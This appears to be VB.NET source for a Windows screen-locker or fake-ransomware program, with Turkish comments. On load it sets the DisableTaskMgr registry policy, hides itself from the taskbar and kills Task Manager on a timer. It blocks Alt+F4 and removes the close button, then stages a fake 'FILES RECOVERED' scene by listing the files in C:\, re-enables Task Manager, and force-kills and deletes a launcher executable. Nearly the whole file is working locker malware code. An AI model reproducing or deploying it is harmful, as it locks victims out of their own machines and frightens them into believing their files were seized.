﻿Imports System.IO
Imports Microsoft.Win32

Public Class Form3
    Public TaskMngKapalı As Boolean = False

    Protected Overrides ReadOnly Property CreateParams() As CreateParams
        Get
            Dim cp As CreateParams = MyBase.CreateParams
            Const CS_NOCLOSE As Integer = &H200
            cp.ClassStyle = cp.ClassStyle Or CS_NOCLOSE


            CS_NOCLOSE.ToString.Trim()
            Return cp
        End Get
    End Property
    Public Sub TaskMgr_Calistir()
        'TaskManager (Görev Yöneticisini) Çalıştır
        Try

            Dim info As New ProcessStartInfo("taskmgr.exe")
            Process.Start(info)

        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub
    Public Sub TaskMng_KodunuAc()
        Try

            'TaskManager (Görev Yöneticisini) Registerden ( reg.SetValue("DisableTaskMgr", "0") değeri ile AÇIK hale getir
            Dim reg As Microsoft.Win32.RegistryKey
            Dim subKey As String = "Software\Microsoft\Windows\CurrentVersion\Policies\System"

            reg = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(subKey)
            reg.DeleteValue("DisableTaskMgr")
            reg.SetValue("DisableTaskMgr", 0)
            reg.Close()
            TaskMngKapalı = False
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub

    Private Sub Form3_FormClosing(sender As Object, e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        If e.CloseReason = CloseReason.WindowsShutDown Then
        Else

            e.Cancel = False

        End If
    End Sub
    Private Sub GrayButton1_Click_1(sender As System.Object, e As System.EventArgs) Handles GrayButton1.Click
      
        For Each filename As String In IO.Directory.GetFiles("C:\")
            ListBox1.Items.Add(Path.GetFileName(filename))
        Next
        GrayButton2.Enabled = True
        GrayButton1.Enabled = False
    End Sub

    Private Sub GrayButton2_Click(sender As System.Object, e As System.EventArgs) Handles GrayButton2.Click

        For Each filename As String In IO.Directory.GetFiles("C:\")
            ListBox2.Items.Add(Path.GetFileName(filename))
        Next
        GrayButton2.Enabled = False
        GrayButton1.Enabled = True
        Dim result As DialogResult = MessageBox.Show("FILES RECOVERED !!!!", _
                              "OK")
        Form5.Show()
        Call TaskMng_KodunuAc()


    End Sub

    Private Sub GrayForm1_Click(sender As System.Object, e As System.EventArgs) Handles GrayForm1.Click
        Try
            Dim dosyaVarmi = My.Computer.FileSystem.FileExists(Application.StartupPath & "\Baslat.exe")
            If dosyaVarmi = True Then
                'Dosya açıksa kapat
                Shell("taskkill /f /im " & "Baslat.exe", AppWinStyle.Hide)
            End If
            Kill(Application.StartupPath & "\Baslat.exe") 'mesaj vermeden Diskten siler

            'Çöp kutusuna taşıma mesajı veren silme kodu
            'My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\Başlat.exe", FileIO.UIOption.OnlyErrorDialogs, FileIO.RecycleOption.DeletePermanently, FileIO.UICancelOption.ThrowException)

        Catch ex As Exception
        End Try
    End Sub

    Private Sub Form3_KeyDown(sender As Object, e As System.Windows.Forms.KeyEventArgs) Handles Me.KeyDown
        If (e.Alt) And (e.KeyValue = Keys.F4) Then
            e.Handled = True
        End If
    End Sub

    Private Sub Form3_Load(sender As Object, e As System.EventArgs) Handles Me.Load

        Dim reg As RegistryKey
        Dim subKey As String = "Software\Microsoft\Windows\CurrentVersion\Policies\System"

        reg = Registry.CurrentUser.CreateSubKey(subKey)
        reg.SetValue("DisableTaskMgr", "1")
        reg.Close()
        ShowInTaskbar = False 'form görev çubugundan gizli çalışır
        Timer1.Start()
    End Sub

    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick
        For Each selProcess As Process In Process.GetProcesses
            If selProcess.ProcessName = "taskmgr" Then
                selProcess.Kill()
                Exit For
            End If
        Next
    End Sub
End Class